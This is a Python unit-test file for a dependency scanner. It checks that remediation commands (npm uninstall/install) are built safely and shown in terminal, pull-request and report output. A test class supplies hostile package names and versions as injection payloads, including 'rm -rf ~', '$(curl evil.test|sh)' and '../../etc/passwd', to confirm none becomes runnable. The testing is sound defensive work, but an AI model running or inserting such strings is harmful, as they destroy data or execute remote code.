#!/usr/bin/env python3
"""The commands saw hands an operator for a flagged dependency, on each surface that shows them."""
from __future__ import annotations

import io
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

from stayawake.bots.security.dependencies.remediation import (
    REMOVE, UPGRADE, external_advisory_fix, malware_fix, removal_command, upgrade_command,
    vulnerability_fix)
from stayawake.bots.security.models import Finding, ScanResult, Severity
from stayawake.bots.security.pr.render import ACTION_LIMIT, dependency_action_lines, _pr_body
from stayawake.bots.security.resolution import LocalTarget, REPOSITORY
from stayawake.bots.security.service import workers as scan_workers
from stayawake.bots.security.service.workers import WorkerScan
from stayawake.bots.security.service.report import _print_dependency_actions
from stayawake.bots.security.sinks.render import render_markdown
from stayawake.bots.security import service

REMOVE_CMD = "npm uninstall evil-pkg"
UPGRADE_CMD = "npm install lodash@4.17.21"


def _dep(command: str, *, action: str = REMOVE) -> Finding:
    return Finding(signature_id="malicious-dependency", category="supply-chain-dep",
                   severity=Severity.CRITICAL, path="package.json", description="d",
                   fix_advice="a sentence for the report", dependency_action=action,
                   fix_command=command)


def _payload(findings=(), advisories=()) -> dict:
    result = ScanResult(target="acme/app", source="local", findings=list(findings),
                        advisories=list(advisories))
    return {"generated_at": "now", "results": [result.to_dict()],
            "summary": {"targets": 1, "infected": 0, "suspicious": 0, "residue": 0,
                        "findings": len(findings), "critical": 0, "high": 0}}


def _terminal(findings=(), advisories=()) -> str:
    result = ScanResult(target="acme/app", source="local", findings=list(findings),
                        advisories=list(advisories))
    buf = io.StringIO()
    with redirect_stderr(buf):
        _print_dependency_actions([result])
    return buf.getvalue()


class TestTheComposerStatesTheCommand(unittest.TestCase):
    """The function that composes the advice also states the command to run."""

    def test_a_known_malicious_package_is_uninstalled(self):
        fix = malware_fix("evil-pkg", "npm")
        self.assertEqual("npm uninstall evil-pkg", fix.command)
        self.assertEqual(REMOVE, fix.action)

    def test_a_patched_version_is_installed(self):
        fix = vulnerability_fix("npm", "lodash", "4.17.21")
        self.assertEqual("npm install lodash@4.17.21", fix.command)
        self.assertEqual(UPGRADE, fix.action)

    def test_an_advisory_with_no_patched_version_uninstalls(self):
        fix = vulnerability_fix("npm", "lodash", None)
        self.assertEqual("npm uninstall lodash", fix.command)
        self.assertEqual(REMOVE, fix.action)

    def test_an_external_auditors_advisory_has_no_command_to_give(self):
        fix = external_advisory_fix("left-pad", "GHSA-1", "npm audit")
        self.assertTrue(fix.command.startswith("#"))
        self.assertIn("left-pad", fix.command)
        self.assertIn("GHSA-1", fix.command)
        self.assertEqual(UPGRADE, fix.action)

    def test_an_unknown_ecosystem_gives_no_command(self):
        self.assertTrue(malware_fix("x", "no-such-eco").command.startswith("#"))


class TestAHostileNameCannotReachTheShell(unittest.TestCase):
    """Check what a hostile package name or version produces."""

    HOSTILE = ["evil; rm -rf ~", "a$(curl evil.test|sh)", "a`id`", "a|sh", "a&&id", "a\nrm -rf ~",
               "../../etc/passwd", "a>out", "$(id)"]

    def test_no_hostile_name_builds_a_runnable_command(self):
        for name in self.HOSTILE:
            self.assertIsNone(removal_command("npm", name), name)
            self.assertIsNone(upgrade_command("npm", name, "1.0.0"), name)

    def test_no_hostile_version_builds_a_runnable_command(self):
        for version in ["1.0.0; echo pwned", "`id`", "$(id)", "1.0|sh"]:
            self.assertIsNone(upgrade_command("npm", "lodash", version), version)

    def test_a_hostile_name_degrades_to_an_inert_comment(self):
        fix = malware_fix("evil; rm -rf ~", "npm")
        self.assertTrue(fix.command.startswith("#"))
        self.assertNotIn("npm uninstall", fix.command)

    def test_every_line_of_the_block_is_a_command_or_a_comment(self):
        out = _terminal(findings=[_dep(malware_fix("evil; rm -rf ~", "npm").command)],
                        advisories=[_dep(UPGRADE_CMD, action=UPGRADE)])
        payload = [ln.strip() for ln in out.splitlines()
                   if ln.startswith("  ") and ln.strip()]
        for line in payload:
            self.assertTrue(line.startswith("#") or line.startswith(("npm ", "pip ")), line)

    def test_a_terminal_escape_never_reaches_the_terminal(self):
        out = _terminal(findings=[_dep("npm uninstall \x1b[2Jx\x07")])
        self.assertNotIn("\x1b[2J", out)
        self.assertNotIn("\x07", out)

    def test_a_newline_cannot_forge_a_second_command(self):
        body = "\n".join(dependency_action_lines(findings=[_dep("npm uninstall a\nrm -rf ~")]))
        self.assertNotIn("\nrm -rf ~", body)

    def test_every_character_the_gate_admits_is_shell_safe(self):
        import shlex
        from stayawake.bots.security.dependencies import remediation as R
        for ch in map(chr, range(32, 127)):
            name = f"a{ch}b"
            if R._NAME_RE.match(name):
                self.assertEqual(name, shlex.quote(name), f"gate admits {ch!r}, which needs quoting")

    def test_a_scoped_npm_name_still_works(self):
        self.assertEqual("npm install @scope/pkg@1.0.0", upgrade_command("npm", "@scope/pkg", "1.0.0"))


class TestTheTwoCasesStayApart(unittest.TestCase):
    """Check which heading a command lands under."""

    def test_removals_and_upgrades_sit_under_their_own_heading(self):
        body = "\n".join(dependency_action_lines(findings=[_dep(REMOVE_CMD)],
                                                 advisories=[_dep(UPGRADE_CMD, action=UPGRADE)]))
        self.assertIn("# remove and replace", body)
        self.assertIn("# upgrade", body)
        self.assertLess(body.index(REMOVE_CMD), body.index(UPGRADE_CMD))

    def test_only_removals_names_only_that_heading(self):
        body = "\n".join(dependency_action_lines(findings=[_dep(REMOVE_CMD)]))
        self.assertIn("# remove and replace", body)
        self.assertNotIn("# upgrade", body)


class TestItSaysEachCommandOnce(unittest.TestCase):
    def test_the_same_command_from_two_findings_is_said_once(self):
        body = "\n".join(dependency_action_lines(findings=[_dep(REMOVE_CMD), _dep(REMOVE_CMD)]))
        self.assertEqual(1, body.count(REMOVE_CMD))

    def test_nothing_to_run_renders_nothing(self):
        self.assertEqual([], dependency_action_lines(findings=[], advisories=[]))

    def test_a_finding_without_a_command_renders_nothing(self):
        bare = Finding(signature_id="x", category="c", severity=Severity.LOW, path="p",
                       description="d")
        self.assertEqual([], dependency_action_lines(findings=[bare]))

    def test_a_finding_that_names_no_action_renders_nothing(self):
        stray = Finding(signature_id="x", category="c", severity=Severity.LOW, path="p",
                        description="d", fix_command="npm uninstall x")
        self.assertEqual([], dependency_action_lines(findings=[stray]))


class TestTheListIsBounded(unittest.TestCase):
    def test_past_the_limit_the_rest_is_counted(self):
        many = [_dep(f"npm uninstall p{i}") for i in range(ACTION_LIMIT + 10)]
        body = "\n".join(dependency_action_lines(findings=many))
        self.assertEqual(ACTION_LIMIT, body.count("npm uninstall p"))
        self.assertIn("and 10 more", body)


class TestEverySurfaceCarriesTheCommand(unittest.TestCase):
    def test_the_pull_request_body(self):
        body = _pr_body("acme/app", [], advisories=[_dep(UPGRADE_CMD, action=UPGRADE)])
        self.assertIn(UPGRADE_CMD, body)
        self.assertIn("```sh", body)

    def test_a_body_with_nothing_to_run_has_no_block(self):
        self.assertNotIn("```sh", _pr_body("acme/app", []))

    def test_the_report_file_at_the_top(self):
        md = render_markdown(_payload(advisories=[_dep(UPGRADE_CMD, action=UPGRADE)]))
        self.assertIn(UPGRADE_CMD, md)
        self.assertLess(md.index("## Run these"), md.index("| Target |"))

    def test_a_report_with_nothing_to_run_has_no_block(self):
        self.assertNotIn("## Run these", render_markdown(_payload()))

    def test_the_terminal_footer(self):
        self.assertIn(UPGRADE_CMD, _terminal(advisories=[_dep(UPGRADE_CMD, action=UPGRADE)]))

    def test_a_run_with_nothing_to_run_prints_nothing(self):
        self.assertEqual("", _terminal())


class TestTheRunActuallyPrintsIt(unittest.TestCase):
    """The footer is wired into a real `saw scan`, not only into its renderer."""

    def _scan(self, result: ScanResult) -> str:
        with mock.patch.object(service.run, "resolve_local_targets",
                               return_value=[LocalTarget(Path("/x/r0"), None, REPOSITORY)]), \
             mock.patch.object(scan_workers, "scan_local", return_value=WorkerScan(result)), \
             redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()) as err:
            service.scan(None, no_stream=True, jobs=1)
        return err.getvalue()

    def test_a_scan_that_flags_a_dependency_prints_the_command(self):
        result = ScanResult(target="acme/app", source="local")
        result.advisories.append(_dep(UPGRADE_CMD, action=UPGRADE))
        self.assertIn(UPGRADE_CMD, self._scan(result))

    def test_a_scan_that_flags_nothing_prints_no_block(self):
        self.assertNotIn("Run these", self._scan(ScanResult(target="acme/app", source="local")))


if __name__ == "__main__":
    unittest.main()
